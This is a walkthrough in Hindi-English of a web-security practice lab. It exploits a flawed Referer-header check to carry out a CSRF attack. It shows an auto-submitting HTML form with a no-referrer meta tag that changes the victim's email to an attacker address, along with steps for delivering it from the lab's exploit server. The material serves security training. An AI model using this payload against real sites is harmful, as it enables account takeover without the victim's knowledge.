### 🔥 **Lab ka Goal**:

Victim user ka email change karwana via **CSRF** attack. Server **Referer header** check karta hai, lekin agar header **absent ho** to request **accept** ho jati hai. Hum exploit server use kar ke victim ko ek HTML page dikhaenge jo unka email secretly change kar dega.

---

## ✅ Step-by-Step Solution:

---

### 🔹 **Step 1: Login and Capture Request**

1. Burp Suite ka browser khol ke login karo:

   * Username: `wiener`
   * Password: `peter`
2. Profile ya Account Settings mein jao aur **email address update** karo (random new email daal do).
3. Burp Suite mein **Proxy > HTTP history** mein us request ko find karo jo email update wali hai.

---

### 🔹 **Step 2: Referer Header Behavior Observe Karo**

1. Request ko **Repeater** mein bhejo.
2. `Referer` header mein domain ko change karo (e.g., `https://evil.com`) → request **reject** ho jaegi.
3. Ab **Referer header ko entirely delete** karo → request **successfully accept** ho jaegi.

💡 **Matlab**: Agar `Referer` ho aur galat ho to block, agar `Referer` na ho to allow. Yani yeh header par hi check ho raha hai — **flawed implementation**.

---

### 🔹 **Step 3: CSRF Exploit HTML Banao**

Ab ek aisi HTML page banao jo victim user ke browser mein chale aur unka email secretly change karde:

```html
<html>
  <head>
    <meta name="referrer" content="no-referrer">
  </head>
  <body>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
      <input type="hidden" name="csrf" value="">
      <input type="submit" value="Submit">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

🟢 **Important Points**:

* `<meta name="referrer" content="no-referrer">` → browser Referer header send **nahi** karega.
* `csrf` field empty rakhna hai kyunki lab mein koi CSRF token protection nahi hai.
* Action URL ko **lab ke original URL se match** karna hai (tumhara lab ka link).

---

### 🔹 **Step 4: Host and Deliver Exploit**

1. Lab ka **Exploit Server** open karo.
2. Upar wali HTML code wahan paste karo.
3. Email address ko aisa rakhna jo `wiener@...` se **different** ho (e.g. `evil@attacker.com`).
4. **Store** button pe click karo.
5. **Deliver to victim** button pe click karo.

---

### 🎯 **Lab Solved**

Agar sab kuch sahi kiya, to victim ka email address attacker wala ho jaega aur lab solve ho jaega.

---

## 🧠 Penetration Testing Tip:

CSRF main yeh exploit isliye kaam karta hai kyunki server sirf `Referer` ki existence check kar raha hai — **value nahi validate** kar raha. Jab header hi nahi hota, to request allow ho jaati hai. Real-world mein bhi aise flawed checks milte hain.
